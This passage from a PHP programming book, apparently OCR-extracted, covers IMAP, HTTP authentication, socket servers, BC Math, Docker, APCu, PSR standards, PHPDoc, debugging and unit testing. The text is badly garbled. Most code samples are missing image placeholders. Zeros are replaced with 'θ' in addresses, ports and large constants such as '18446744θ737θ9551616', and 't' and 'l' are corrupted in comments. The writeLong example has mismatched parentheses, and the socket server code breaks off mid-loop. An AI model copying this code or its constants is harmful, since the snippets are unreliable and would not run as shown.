remote authentication user; if specified this is the user name whose password is used (e.g. administrator)

/anonymous​remote access as anonymous user

pop3, nntp, smtp

imap

/debug​record protocol telemetry in application's debug log​disabled

/secure​do not transmit a plaintext password over the network

/norsh​do not use rsh or ssh to establish a preauthenticated IMAP session

/ssl​use the Secure Socket Layer to encrypt the session

/validate\-cert certificates from TLS/SSL server​enabled

![](image_rsrcN78.jpg)do not validate certificates from TLS/SSL server, needed if server uses self- signed certificates. USE WITH CAUTION

![](image_rsrcN79.jpg)

force use of start-TLS to encrypt the session, and reject connection to servers that do not support it

![](image_rsrcN7A.jpg)do not do start-TLS to encrypt the session, even with servers that support it

![](image_rsrcN7B.jpg)

request read-only mailbox open (IMAP only; ignored on NNTP, and an error with SMTP and POP3)

Your connection string will look something like this:

disabled

![](image_rsrcN7C.jpg)

Please note that if any of the characters in your connection string is non-ASCII it must be encoded with utf7\_encode($string).

To connect to the mailbox, we use the imap\_open command which returns a resource value pointing to a stream:

![](image_rsrcN7D.jpg)

Section 81.2: Install IMAP extension

To use the IMAP functions in PHP you'll need to install the IMAP extension:

Debian/Ubuntu with PHP5

![](image_rsrcN7E.jpg)

Debian/Ubuntu with PHP7

![](image_rsrcN7F.jpg)

YUM based distro

![](image_rsrcN7G.jpg)

Mac OS X with php5.6

![](image_rsrcN7H.jpg)

Section 81.3: List all folders in the mailbox

Once you've connected to your mailbox, you'll want to take a look inside. The first useful command is imap\_list. The first parameter is the resource you acquired from imap\_open, the second is your mailbox string and the third is a fuzzy search string (\* is used to match any pattern).

![](image_rsrcN7J.jpg)

The output should look similar to this

![](image_rsrcN7K.jpg)

You can use the third parameter to filter these results like this:

![](image_rsrcN7M.jpg)

And now the result only contains entries with .Sent in the name:

![](image_rsrcN7N.jpg)

Note: Using \* as a fuzzy search will return all matches recursively. If you use % it will return only matches in the current folder specified.

Section 81.4: Finding messages in the mailbox

You can return a list of all the messages in a mailbox using imap\_headers.

![](image_rsrcN7P.jpg)

The result is an array of strings with the following pattern:

![](image_rsrcN7R.jpg)

Here's a sample of what each line could look like:

![](image_rsrcN7S.jpg)

Symbol​Flag​Meaning

A​Answered Message has been replied to

| D || Deleted || Message is deleted (but not removed) |
| --- | --- | --- |
| F || Flagged || Message is flagged/stared for attention |
| N || New || Message is new and has not been seen |
| R || Recent || Message is new and has been seen |
| U || Unread || Message has not been read |
| X || Draft || Message is a draft |

Note that this call could take a fair amount of time to run and may return a very large list.

An alternative is to load individual messages as you need them. Your emails are each assigned an ID from 1 (the oldest) to the value of imap\_num\_msg($mailbox).

There are a number of functions to access an email directly, but the simplest way is to use imap\_header which returns structured header information:

![](image_rsrcN7T.jpg)

![](image_rsrcN7U.jpg)

Chapter 82: HTTP Authentication

In this topic we gonna make a HTTP-Header authenticate script.

Section 82.1: Simple authenticate

PLEASE NOTE: ONLY PUT THIS CODE IN THE HEADER OF THE PAGE, OTHERWISE IT WILL NOT WORK!

![](image_rsrcN7V.jpg)

Chapter 83: WebSockets

Usage of socket extension implements a low-level interface to the socket communication functions based on the popular BSD sockets, providing the possibility to act as a socket server as well as a client.

Section 83.1: Simple TCP/IP server

Minimal example based on PHP manual example found here: [http://php.net/manual/en/sockets.examples.php](http://php.net/manual/en/sockets.examples.php)

Create a websocket script that listens to Port 5000 Use putty, terminal to run telnet 127.θ.θ.1 5θθθ (localhost). This script replies with the message you sent (as a ping-back)

![](image_rsrcN7W.jpg)<?php

set\_time\_limit(θ); // disabﾕe łimeouł

ob\_implicit\_flush(); // disabﾕe oułpuł caching

// Sełłings

$address \= '127.θ.θ.1';

$port \= 5θθθ;

/\*

funcłion sockeł\_creałe ( inł $domain , inł $łype , inł $prołocoﾕ )

$domain can be AF\_INET, AF\_INET6 for IPV6 , AF\_UNIX for Locaﾕ communicałion prołocoﾕ

$prołocoﾕ can be SOL\_TCP, SOL\_UDP (TCP/UDP) @rełurns łrue on success

\*/

if (($socket \= socket\_create(AF\_INET, SOCK\_STREAM, SOL\_TCP)) \=== false) { echo "Couldn't create socket".socket\_strerror(socket\_last\_error())."\\n";

}

/\*

sockeł\_bind ( resource $sockeł , słring $address \[, inł $porł = 0 \] ) Bind sockeł ło ﾕisłen ło address and porł

\*/

if (socket\_bind($socket, $address, $port) \=== false) {

echo "Bind Error ".socket\_strerror(socket\_last\_error($sock)) ."\\n";

}

if (socket\_listen($socket, 5) \=== false) {

echo "Listen Failed ".socket\_strerror(socket\_last\_error($socket)) . "\\n";

}

do {

if (($msgsock \= socket\_accept($socket)) \=== false) {

echo "Error: socket\_accept: " . socket\_strerror(socket\_last\_error($socket)) . "\\n"; break;

}

/\* Send Weﾕcome message. \*/

$msg \= "\\nPHP Websocket \\n";

// Lisłen ło user inpuł

do {

if (false \=== ($buf \= socket\_read($msgsock, 2θ48, PHP\_NORMAL\_READ))) {

echo "socket read error: ".socket\_strerror(socket\_last\_error($msgsock)) . "\\n";

403

![](image_rsrcN7X.jpg)

Chapter 84: BC Math (Binar6 Calculator)

bcadd​Add two arbitrary precision numbers.

left\_operand The left operand, as a string.

right\_operand The right operand, as a string.

scale​A optional parameter to set the number of digits after the decimal place in the result. bccomp              Compare two arbitrary precision numbers.

left\_operand The left operand, as a string.

right\_operand The right operand, as a string.

![](image_rsrcN7Y.jpg)

A optional parameter to set the number of digits after the decimal place which will be used in the comparison.

bcdiv​Divide two arbitrary precision numbers. left\_operand The left operand, as a string. right\_operand The right operand, as a string.

scale​A optional parameter to set the number of digits after the decimal place in the result. bcmod              Get modulus of an arbitrary precision number.

left\_operand The left operand, as a string.

modulus​The modulus, as a string.

bcmul​Multiply two arbitrary precision numbers. left\_operand The left operand, as a string. right\_operand The right operand, as a string.

scale​A optional parameter to set the number of digits after the decimal place in the result. bcpow              Raise an arbitrary precision number to another.

left\_operand The left operand, as a string.

right\_operand The right operand, as a string.

scale​A optional parameter to set the number of digits after the decimal place in the result. bcpowmod              Raise an arbitrary precision number to another, reduced by a specified modulus. left\_operand The left operand, as a string.

right\_operand The right operand, as a string.

modulus​The modulus, as a string.

scale​A optional parameter to set the number of digits after the decimal place in the result. bcscale              Set default scale parameter for all bc math functions.

scale​The scale factor.

bcsqrt​Get the square root of an arbitrary precision number.

operand​The operand, as a string.

scale​A optional parameter to set the number of digits after the decimal place in the result. bcsub              Subtract one arbitrary precision number from another.

left\_operand The left operand, as a string.

right\_operand The right operand, as a string.

scale​A optional parameter to set the number of digits after the decimal place in the result.

The Binary Calculator can be used to calculate with numbers of any size and precision up to 2147483647-1 decimals, in string format. The Binary Calculator is more precise than the float calculation of PHP.

Section 84.1: Using bcmath to read/write a binar6 long on 32-

bit s6stem

On 32-bit systems, integers greater than θx7FFFFFFF cannot be stored primitively, while integers between θxθθθθθθθθ8θθθθθθθ and θx7FFFFFFFFFFFFFFF can be stored primitively on 64-bit systems but not 32-bit systems (signed long long). However, since 64-bit systems and many other languages support storing signed long long integers, it is sometimes necessary to store this range of integers in exact value. There are several ways to do so, such as creating an array with two numbers, or converting the integer into its decimal human-readable form. This has several advantages, such as the convenience in presenting to the user, and the ability to manipulate it with bcmath directly.

![](image_rsrcN7Z.jpg)The pack/unpack methods can be used to convert between binary bytes and decimal form of the numbers (both of type string, but one is binary and one is ASCII), but they will always try to cast the ASCII string into a 32-bit int on 32-bit systems. The following snippet provides an alternative:

![](image_rsrcN80.jpg)/\*\* Use pack("J") or pack("p") for 64-bił sysłems \*/

function writeLong(string $ascii) : string { if(bccomp($ascii, "θ") === -1) { // if $ascii  0

// 18446744073709551616 is equaﾕ ło (1​64)

// remember ło add łhe quołes, or łhe number wiﾕﾕ be parsed as a fﾕoał ﾕiłeraﾕ

$ascii \= bcadd($ascii, "18446744θ737θ9551616");

}

// "n" is big\-endian 16-bił unsigned shorł. Use "v" for smaﾕﾕ-endian.

return pack("n", bcmod(bcdiv($ascii, "28147497671θ656"), "65536")) . pack("n", bcmod(bcdiv($ascii, "4294967296"), "65536")) .

pack("n", bcdiv($ascii, "65536"), "65536")) .

pack("n", bcmod($ascii, "65536"));

}

function readLong(string $binary) : string {

$result \= "θ";

$result \= bcadd($result, unpack("n", substr($binary, θ, 2)));

$result \= bcmul($result, "65536");

$result \= bcadd($result, unpack("n", substr($binary, 2, 2)));

$result \= bcmul($result, "65536");

$result \= bcadd($result, unpack("n", substr($binary, 4, 2)));

$result \= bcmul($result, "65536");

$result \= bcadd($result, unpack("n", substr($binary, 6, 2)));

// if $binary is a signed ﾕong ﾕong

// 9223372036854775808 is equaﾕ ło (1​63) (nołe łhał łhis expression acłuaﾕﾕy does noł work even on 64-bił sysłems)

if(bccomp($result, "9223372θ368547758θ8") !== \-1) { // if $resuﾕł \>= 9223372036854775807

$result \= bcsub($result, "18446744θ737θ9551616"); // $resuﾕł \-= (1​64)

}

return $result;

}

Section 84.2: Comparison between BCMath and ;oat arithmetic operations

![](image_rsrcN81.jpg)bcadd vs float+float

var\_dump('1θ' + '-9.99');

var\_dump(1θ + \-9.99);

var\_dump(1θ.θθ + \-9.99);

// fﾕoał(0.0099999999999998)

// fﾕoał(0.0099999999999998)

// fﾕoał(0.0099999999999998)

var\_dump(bcadd('1θ', '-9.99', 2θ)); // słring(22) "0.01000000000000000000"

bcsub vs float-float

![](image_rsrcN82.jpg)var\_dump('1θ' \- '9.99');

var\_dump(1θ \- 9.99);

var\_dump(1θ.θθ \- 9.99);

// fﾕoał(0.0099999999999998)

// fﾕoał(0.0099999999999998)

// fﾕoał(0.0099999999999998)

var\_dump(bcsub('1θ', '9.99', 2θ)); // słring(22) "0.01000000000000000000"

bcmul vs int\*int

![](image_rsrcN83.jpg)var\_dump('5.θθ' \* '2.θθ'); var\_dump(5.θθ \* 2.θθ); var\_dump(bcmul('5.θ', '2', 2θ));

// fﾕoał(10)

// fﾕoał(10)

// słring(4) "10.0"

var\_dump(bcmul('5.θθθ', '2.θθ', 2θ)); // słring(8) "10.00000"

var\_dump(bcmul('5', '2', 2θ));​//  słring(2)  "10"

bcmul vs float\*float

![](image_rsrcN84.jpg)

![](image_rsrcN85.jpg)bcdiv vs float/float

var\_dump('1θ' / '3.θ1'); var\_dump(1θ / 3.θ1); var\_dump(1θ.θθ / 3.θ1);

// fﾕoał(3.3222591362126)

// fﾕoał(3.3222591362126)

// fﾕoał(3.3222591362126)

var\_dump(bcdiv('1θ', '3.θ1', 2θ)); // słring(22) "3.32225913621262458471"

Chapter 85: Docker deplo6ment

Docker is a very popular container solution being used widely for deploying code in production environments. It makes it easier to Manage and Scale web-applications and microservices.

Section 85.1: Get docker image for php

In order to deploy the application on docker, first we need to get the image from registry.

![](image_rsrcN86.jpg)

This will get you the latest version of image from official php repository. Generally speaking, PHP is usually used to deploy web-applications so we need an http server to go with the image. php:7.θ\-apache image comes pre- installed with apache to make deployment hastle free.

Section 85.2: Writing dockerfile

Dockerfile is used to configure the custom image that we will be building with the web-application codes. Create a new file Dockerfile in the root folder of project and then put the following contents in the same

![](image_rsrcN87.jpg)

The first line is pretty straight forward and is used to describe which image should be used to build out new image. The same could be changed to any other specific version of PHP from the registry.

Second line is simply to upload php.ini file to our image. You can always change that file to some other custom file location.

The third line would copy the codes in current directory to /var/www/html which is our webroot. Remember

/var/www/html inside the image.

The last line would simply open up port 80 inside the docker container. Ignoring files

In some instances there might be some files that you don't want on server like environment configuration etc. Let us assume that we have our environment in .env. Now in order to ignore this file, we can simply add it to

.dockerignore in the root folder of our codebase.

Section 85.3: Building image

Building image is not something specific to php, but in order to build the image that we described above, we can simply use

![](image_rsrcN88.jpg)

Once the image is built, you can verify the same using

![](image_rsrcN89.jpg)

Which would list out all the images installed in your system.

Section 85.4: Starting application container

Once we have an image ready, we can start and serve the same. In order to create a container from the image, use

![](image_rsrcN8A.jpg)

In the command above \-p 8θ:8θ would forward port 8θ of your server to port 8θ of the container. The flag \-d tells that the container should run as background job. The final specifies which image should be used to build the container.

Checking container

In order to check running containers, simply use

![](image_rsrcN8B.jpg)

This will list out all the containers running on docker daemon. Application logs

Logs are very important to debug the application. In order to check on them use

![](image_rsrcN8C.jpg)

Chapter 86: APCu

APCu is a shared memory key-value store for PHP. The memory is shared between PHP-FPM processes of the same pool. Stored data persists between requests.

Section 86.1: Iterating over Entries

The APCUIterator allows to iterate over entries in the cache:

![](image_rsrcN8D.jpg)

The iterator can be initialized with an optional regular expression to select only entries with matching keys:

![](image_rsrcN8E.jpg)

Information about a single cache entry can be obtained via:

![](image_rsrcN8F.jpg)

Section 86.2: Simple storage and retrieval

apcu\_store can be used to store, apcu\_fetch to retrieve values:

![](image_rsrcN8G.jpg)

Section 86.3: Store information

apcu\_cache\_info provides information about the store and its entries:

![](image_rsrcN8H.jpg)

![](image_rsrcKJ7.jpg)Note that invoking apcu\_cache\_info() without limit will return the complete data currently stored. To only get the meta data, use apcu\_cache\_info(true).

To get information about certain cache entries better use APCUIterator.

Chapter 87: PHP Built in server

Column​Column

\-S​Tell the php that we want a webserver

<hostname>:<port> The host name and the por to be used

\-t​Public directory

<filename>​The routing script

Learn how to use the built in server to develop and test your application without the need of other tools like xamp, wamp, etc.

Section 87.1: Running the built in server

![](image_rsrcKT9.jpg)php \-S localhost:8θ

PHP 7.1.7 Development Server started at Fri Jul 14 15:11:05 2017 Listening on http://localhost:80

Document root is C:\\projetos\\repgeral Press Ctrl-C to quit.

This is the simplest way to start a PHP server that responds to request made to localhost at the port 80. The -S tells that we are starting a webserver.

The localhost:80 indicates the host that we are answering and the port. You can use other combinations like:

![](image_rsrcN8J.jpg)![](image_rsrcN8K.jpg)mymachine:80 - will listen on the address mymachine and port 80; 127.0.0.1:8080 - will listen on the address 127.0.0.1 and port 8080;

Section 87.2: built in server with specific director6 and router script

![](image_rsrcN8M.jpg)php \-S localhost:8θ \-t project/public router.php

PHP 7.1.7 Development Server started at Fri Jul 14 15:22:25 2017 Listening on http://localhost:80

Document root is /home/project/public Press Ctrl-C to quit.

Chapter 88: PSR

The PSR (PHP Standards Recommendation) is a series of recommendations put together by the FIG (Framework Interop Group).

"The idea behind the group is for project representatives to talk about the commonalities between our projects and find ways we can work together" - FIG FAQ

PSRs can be in the following states: Accepted, Review, Draft or Deprecated.

Section 88.1: PSR-4: Autoloader

PSR-4 is an accepted recommendation that outlines the standard for autoloading classes via filenames. This recommendation is recommended as the alternative to the earlier (and now deprecated) PSR-0.

The fully qualified class name should match the following requirement:

![](image_rsrcN8N.jpg)

![](image_rsrcN8P.jpg)It MUST contain a top level vendor namespace (E.g.: Alphabet)

![](image_rsrcN8R.jpg)![](image_rsrcN8S.jpg)It MAY contain one or more sub-namespaces (E.g.: Google\\AdWord) It MUST contain an ending class name (E.g.: KeywordPlanner)

Thus the final class name would be Alphabet\\Google\\AdWord\\KeywordPlanner. The fully qualified class name should also translate into a meaningful file path therefore Alphabet\\Google\\AdWord\\KeywordPlanner would be located in \[path\_to\_source\]/Alphabet/Google/AdWord/KeywordPlanner.php

Starting with PHP 5.3.0, a custom autoloader function can be defined to load files based on the path and filename pattern that you define.

![](image_rsrcN8T.jpg)

Replacing the location ('classes/') and filename extension ('.class.php') with values that apply to your structure.

Composer package manager supports PSR-4 which means, if you follow the standard, you can load your classes in your project automatically using Composer's vendor autoloader.

![](image_rsrcN8U.jpg)

Regenerate the autoloader file

![](image_rsrcN8V.jpg)

Now in your code you can do the following:

![](image_rsrcN8W.jpg)

![](image_rsrcN8X.jpg)

Section 88.2: PSR-1: Basic Coding Standard

PSR-1 is an accepted recommendation and outlines a basic standard recommendation for how code should be written.

![](image_rsrcN8Y.jpg)![](image_rsrcN8Z.jpg)![](image_rsrcN90.jpg)It outlines naming convetions for classes, methods and constants. It makes adopting PSR-0 or PSR-4 recommendations a requirement. It indicates which PHP tags to use: <?php and <?= but not <?.

![](image_rsrcN91.jpg)It specifies what file encoding to use (UTF8).

![](image_rsrcN92.jpg)It also states that files should either declare new symbols (classes, functions, constants, etc.) and cause no other side effects, or execute logic with side effects and not define symbols, but do both.

413

Chapter 89: PHPDoc

Section 89.1: Describing a variable

The

keyword can be used to describe the type and usage of: a class property

![](image_rsrcN93.jpg)

![](image_rsrcN94.jpg)![](image_rsrcN95.jpg)![](image_rsrcN96.jpg)a local or global variable a class or global constant

![](image_rsrcN97.jpg)

The type can be one of the built-in PHP types, or a user-defined class, including namespaces.

The name of the variable should be included, but can be omitted if the docblock applies to only one item.

Section 89.2: Adding metadata to functions

Function level annotations help IDEs identify return values or potentially dangerous code

![](image_rsrcN98.jpg)

![](image_rsrcN99.jpg)

Section 89.3: Describing parameters

![](image_rsrcN9A.jpg)/\*\*

\*   Paramełers

\*

\*   @param inł​$inł

\*   @param słring $słring

\*   @param array $array

\*   @param  booﾕ​$booﾕ

\*/

function demo\_param($int, $string, $array, $bool)

{

}

/\*\*

\*   Paramełers \- Opłionaﾕ / Defauﾕłs

\*

\*   @param inł​$inł

\*   @param słring $słring

\*   @param array $array

\*   @param  booﾕ​$booﾕ

\*/

function demo\_param\_optional($int \= 5, $string \= 'foo', $array \= \[\], $bool \= false)

{

}

/\*\*

\*   Paramełers \- Arrays

\*

\*   @param array​$mixed

\*   @param inł\[\]​$inłegers

\*   @param słring\[\]​$słrings

\*   @param booﾕ\[\]​$booﾕs

\*   @param słring\[\]/inł\[\] $słrings\_or\_inłegers

\*/

function demo\_param\_arrays($mixed,$integers, $strings, $bools, $strings\_or\_integers)

{

}

/\*\*

\*   Paramełers \- Compﾕex

\*   @param array $config

\*     pre>

\*   $params \= \[

\*                       'hosłname'​\=> (słring) DB hosłname. Required.

\*                       'dałabase'​\=> (słring) DB name. Required.

\*                       'username'​\=> (słring) DB username. Required.

\* \]

\*   /pre>

\*/

function demo\_param\_complex($config)

{

415

![](image_rsrcN9B.jpg)

Section 89.4: Collections

PSR-5 proposes a form of Generics-style notation for collections.

![](image_rsrcN9C.jpg)Generics Syntax

Values in a Collection MAY even be another array and even another Collection.

![](image_rsrcN9D.jpg)

Examples

![](image_rsrcN9E.jpg)

![](image_rsrcN9F.jpg)

Section 89.5: Adding metadata to files

File level metadata applies to all the code within the file and should be placed at the top of the file:

![](image_rsrcN9G.jpg)

Section 89.6: Inheriting metadata from parent structures

If a class extends another class and would use the same metadata, providing it @inheritDoc is a simple way for use the same documentation. If multiple classes inherit from a base, only the base would need to be changed for the children to be affected.

![](image_rsrcN9H.jpg)

![](image_rsrcN9J.jpg)

![](image_rsrcN9K.jpg)Chapter 90: Design Patterns

This topic provides examples of well known design patterns implemented in PHP.

Section 90.1: Method Chaining in PHP

![](image_rsrcKH6.jpg)Method Chaining is a technique explained in Martin Fowler's book Domain Specific Languages. Method Chaining is summarized as

Makes modifier methods return the host object, so that multiple modifiers can be invoked in a single expression.

Consider this non-chaining/regular piece of code (ported to PHP from the aforementioned book)

![](image_rsrcN9M.jpg)

Method Chaining would allow you to write the above statements in a more compact way:

![](image_rsrcN9N.jpg)

All you need to do for this to work is to return $this in the methods you want to chain from:

![](image_rsrcN9P.jpg)

When to use it

The primary use cases for utilizing Method Chaining is when building internal Domain Specific Languages. Method Chaining is a building block in Expression Builders and Fluent Interfaces. It is not synonymous with those, though. Method Chaining merely enables those. Quoting Fowler:

![](image_rsrcN9R.jpg)I've also noticed a common misconception - many people seem to equate fluent interfaces with Method Chaining. Certainly chaining is a common technique to use with fluent interfaces, but true fluency is much more than that.

With that said, using Method Chaining just for the sake of avoiding writing the host object is considered a code smell by many. It makes for unobvious APIs, especially when mixing with non-chaining APIs.

Additional Notes

Command Query Separation

Command Query Separation is a design principle brought forth by Bertrand Meyer. It states that methods mutating state (commands) should not return anything, whereas methods returning something (queries) should not mutate state. This makes it easier to reason about the system. Method Chaining violates this principle because we are mutating state and returning something.

Getters

When making use of classes which implement method chaining, pay particular attention when calling getter methods (that is, methods which return something other than $this). Since getters must return a value other than

$this, chaining an additional method onto a getter makes the call operate on the gotten value, not on the original object. While there are some use cases for chained getters, they may make code less readable.

Law of Demeter and impact on testing

Method Chaining as presented above does not violate Law of Demeter. Nor does it impact testing. That is because we are returning the host instance and not some collaborator. It's a common misconception stemming from people confusing mere Method Chaining with Fluent Interfaces and Expression Builders. It is only when Method Chaining returns other objects than the host object that you violate Law of Demeter and end up with Mock fests in your tests.

Chapter 91: Compile PHP Extensions

Section 91.1: Compiling on Linux

![](image_rsrcN9S.jpg)To compile a PHP extension in a typical Linux environment, there are a few pre-requisites: Basic Unix skills (being able to operate "make" and a C compiler)

![](image_rsrcN9T.jpg)An ANSI C compiler

![](image_rsrcN9U.jpg)The source code for the PHP extension you want to compile

Generally there are two ways to compile a PHP extension. You can statically compile the extension into the PHP binary, or compile it as a shared module loaded by your PHP binary at startup. Shared modules are more likely since they allow you to add or remove extensions without rebuilding the entire PHP binary. This example focuses on the shared option.

![](image_rsrcN9V.jpg)If you installed PHP via your package manager (apt\-get install, yum install, etc..) you will need to install the \- dev package for PHP, which will include the necessary PHP header files and phpize script for the build environment to work. The package might be named something like php5\-dev or php7\-dev, but be sure to use your package manager to search for the appropriate name using your distro's repositories. They can differ.

If you built PHP from source the header files most likely already exist on your system (usually in /usr/include or

/usr/local/include). Steps to compile

After you check to make sure you have all the prerequisites, necessary to compile, in place you can head over to pecl.php.net, select an extension you wish to compile, and download the tar ball.

1.  Unpack the tar ball (e.g. tar xfvz yaml\-2.θ.θRC8.tgz)

2.  Enter the directory where the archive was unpacked and run phpize

3.  You should now see a newly created .configure script if all went well, run that ./configure

4.  Now you will need to run make, which will compile the extension

5.  Finally, make install will copy the compiled extension binary to your extension directory

The make install step will typically provide the installation path for you where the extension was copied. This is usually in /usr/lib/, for example it might be something like /usr/lib/php5/2θ131226/yaml.so. But this depends on your configuration of PHP (i.e. \--with\-prefix) and specific API version. The API number is included in the path to keep extensions built for different API versions in separate locations.

Loading the Extension in PHP

To load the extension in PHP, find your loaded php.ini file for the appropriate SAPI, and add the line

extension\=yaml.so then restart PHP. Change yaml.so to the name of the actual extension you installed, of course.

For a Zend extension you do need to provide the full path to the shared object file. However, for normal PHP extensions this path derived from the extension\_dir directive in your loaded configuration, or from the $PATH environment during initial setup.

Chapter 92: Common Errors

Section 92.1: Call fetch\_assoc on boolean

If you get an error like this:

![](image_rsrcN9W.jpg)

Other variations include something along the lines of:

![](image_rsrcN9X.jpg)

These errors mean that there is something wrong with either your query (this is a PHP/MySQL error), or your referencing. The above error was produced by the following code:

![](image_rsrcN9Y.jpg)

In order to "fix" this error, it is recommended to make mysql throw exceptions instead:

![](image_rsrcN9Z.jpg)

This will then throw an exception with this much more helpful message instead:

![](image_rsrcNA0.jpg)

Another example that would produce a similar error, is where you simply just gave the wrong information to the

mysql\_fetch\_assoc function or similar:

![](image_rsrcNA1.jpg)

Section 92.2: Unexpected $end

![](image_rsrcNA2.jpg)

If you get an error like this (or sometimes unexpected $end, depending on PHP version), you will need to make sure that you've matched up all inverted commas, all parentheses, all curly braces, all brackets, etc.

The following code produced the above error:

![](image_rsrcNA3.jpg)

the last line of your document.

Chapter 93: Compilation of Errors and Warnings

Section 93.1: Parse error: s6ntax error, unexpected T\_PAAMAYIM\_NEßUDOTAYIM

Appearance:

"Paamayim Nekudotayim" means "double colon" in Hebrew; thus this error refers to the inappropriate use of the double colon operator (::). The error is typically caused by an attempt to call a static method that is, in fact, not static.

Possible Solution:

![](image_rsrcNA4.jpg)

If the above code causes this error, you most likely need to simply change the way you call the method:

![](image_rsrcNA5.jpg)

The latter example assumes that $classname is an instance of a class, and the doMethod() is not a static method of that class.

Section 93.2: Notice: Undefined index

Appearance:

Trying to access an array by a key that does not exist in the array Possible Solution:

Check the availability before accessing it. Use:

1.  isset()

2.  array\_key\_exists()

Section 93.3: Warning: Cannot modif6 header information - headers alread6 sent

Appearance:

Happens when your script tries to send a HTTP header to the client but there already was output before, which resulted in headers to be already sent to the client.

Possible Causes:

1.  Print, echo: Output from print and echo statements will terminate the opportunity to send HTTP headers. The application flow must be restructured to avoid that.

2.  Raw HTML areas: Unparsed HTML sections in a .php file are direct output as well. Script conditions that will trigger a header() call must be noted before any raw blocks.

![](image_rsrcNA6.jpg)

3.  ![](image_rsrcNA7.jpg)Whitespace before ?php for "script.php line 1" warnings: If the warning refers to output in line 1, then it's

mostly leading whitespace, text or HTML before the opening <?php token.

![](image_rsrcNA8.jpg)

Reference from SO answer by Mario

Chapter 94: Exception Handling and Error Reporting

Section 94.1: Setting error reporting and where to displa6 them

If it's not already done in php.ini, error reporting can be set dynamically and should be set to allow most errors to be shown:

Syntax

![](image_rsrcNA9.jpg)

Examples

![](image_rsrcNAA.jpg)![](image_rsrcNAB.jpg)

errors will be logged by default by php, normally in a error.log file at the same level than the running script. in development environment, one can also show them on screen:

in production however, one should

![](image_rsrcNAC.jpg)

and show a friendly problem message through the use of an Exception or Error handler.

Section 94.2: Logging fatal errors

In PHP, a fatal error is a kind of error that cannot be caught, that is, after experiencing a fatal error a program does not resume. However, to log this error or somehow handle the crash you can use register\_shutdown\_function to register shutdown handler.

![](image_rsrcNAD.jpg)

![](image_rsrcNAE.jpg)

Reference:

![](image_rsrcNAF.jpg)![](image_rsrcNAG.jpg)![](image_rsrcNAH.jpg)[http://php.net/manual/en/function.register-shutdown-function.php](http://php.net/manual/en/function.register-shutdown-function.php) [http://php.net/manual/en/function.error-get-last.php](http://php.net/manual/en/function.error-get-last.php) [http://php.net/manual/en/errorfunc.constants.php](http://php.net/manual/en/errorfunc.constants.php)

427

Chapter 95: Debugging

Section 95.1: Dumping variables

The var\_dump function allows you to dump the contents of a variable (type and value) for debugging.

Example:

![](image_rsrcNAJ.jpg)

Output:

![](image_rsrcNAK.jpg)

Section 95.2: Displa6ing errors

If you want PHP to display runtime errors on the page, you have to enable display\_errors, either in the php.ini or using the ini\_set function.

You can choose which errors to display, with the error\_reporting (or in the ini) function, which accepts E\_\*

constants, combined using bitwise operators.

PHP can display errors in text or HTML format, depending on the html\_errors setting.

Example:

![](image_rsrcNAM.jpg)

![](image_rsrcNAN.jpg)

Plain text output: (HTML format differs between implementations)

![](image_rsrcNAP.jpg)

![](image_rsrcNAR.jpg)NOTE: If you have error reporting disabled in php.ini and enable it during runtime, some errors (such as parse errors) won't be displayed, because they occurred before the runtime setting was applied.

The common way to handle error\_reporting is to enable it fully with E\_ALL constant during the development, and to disable publicly displaying it with display\_errors on production stage to hide the internals of your scripts.

Section 95.3: phpinfo()

Warning

It is imperative that phpinfo is only used in a development environment. Never release code containing

phpinfo into a production environment Introduction

Having said that, it can be a useful tool in understanding the PHP environment (OS, configuration, versions, paths, modules) in which you are working, especially when chasing a bug. It is a simple built in function:

![](image_rsrcNAS.jpg)

It has one parameter $what that allows the output to be customized. The default is INFO\_ALL, causing it to display all information and is commonly used during development to see the current state of PHP.

You can pass the parameter INFO\_\* constants, combined with bitwise operators to see a customized list.

You can run it in the browser for a nicely formatted detailed look. It also works in PHP CLI, where you can pipe it into less for easier view.

![](image_rsrcNAT.jpg)Example

This will display a list of PHP directives (ini\_get), environment ($\_ENV) and predefined variables.

Section 95.4: Xdebug

Xdebug is a PHP extension which provides debugging and profiling capabilities. It uses the DBGp debugging protocol.

![](image_rsrcNAU.jpg)There are some nice features in this tool:

![](image_rsrcNAV.jpg)maximum nesting level protection and time tracking

![](image_rsrcNAW.jpg)helpful replacement of standard var\_dump() function for displaying variables

![](image_rsrcNAX.jpg)![](image_rsrcNAY.jpg)allows to log all function calls, including parameters and return values to a file in different formats code coverage analysis

![](image_rsrcNAZ.jpg)profiling information

![](image_rsrcNB0.jpg)remote debugging (provides interface for debugger clients that interact with running PHP scripts)

As you can see this extension is perfectly suited for development environment. Especially remote debugging feature can help you to debug your php code without numerous var\_dump's and use normal debugging process as in C++ or Java languages.

Usually installing of this extension is very simple:

![](image_rsrcNB1.jpg)

And activate it into your php.ini:

![](image_rsrcNB2.jpg)

In more complicated cases see this instructions

When you use this tool you should remember that:

XDebug is not suitable for production environments

Section 95.5: Error Reporting (use them both)

![](image_rsrcNB3.jpg)

Section 95.6: phpversion()

Introduction

When working with various libraries and their associated requirements, it is often necessary to know the version of current PHP parser or one of it's packages.

This function accepts a single optional parameter in the form of extension name: phpversion('extension'). If the extension in question is installed, the function will return a string containing version value. However, if the extension not installed FALSE will be returned. If the extension name is not provided, the function will return the version of PHP parser itself.

![](image_rsrcNB4.jpg)Example

Chapter 96: Unit Testing

Section 96.1: Testing class rules

Let's say, we have a simple LoginForm class with rules() method (used in login page as framework template):

![](image_rsrcNB5.jpg)class LoginForm { public $email; public $rememberMe; public $password;

/\* ruﾕes() mełhod rełurns an array wiłh whał each fieﾕd has as a requiremenł.

\* Login form uses emaiﾕ and password ło aułhenłicałe user.

\*/

public function rules() {

return \[

// Emaiﾕ and Password are bołh required

\[\['email', 'password'\], 'required'\],

// Emaiﾕ musł be in emaiﾕ formał

\['email', 'email'\],

// rememberMe musł be a booﾕean vaﾕue

\['rememberMe', 'boolean'\],

// Password musł małch łhis pałłern (musł conłain onﾕy ﾕełłers and numbers)

\['password', 'match', 'pattern' \=> '/^\[a-zθ-9\]+$/i'\],

\];

}

/\*\* łhe vaﾕidałe funcłion checks for correcłness of łhe passed ruﾕes \*/

public function validate($rule) {

$success \= true; list($var, $type) = $rule;

foreach ((array) $var as $var) { switch ($type) {

case "required":

$success \= $success && $this\->$var != ""; break;

case "email":

$success \= $success && filter\_var($this\->$var, FILTER\_VALIDATE\_EMAIL); break;

case "boolean":

$success \= $success && filter\_var($this\->$var, FILTER\_VALIDATE\_BOOLEAN, FILTER\_NULL\_ON\_FAILURE) !== null;

break; case "match":

$success \= $success && preg\_match($rule\["pattern"\], $this\->$var); break;

default:

throw new \\InvalidArgumentException("Invalid filter type passed")

}

}

return $success;

}

}

In order to perform tests on this class, we use Unit tests (checking source code to see if it fits our expectations):

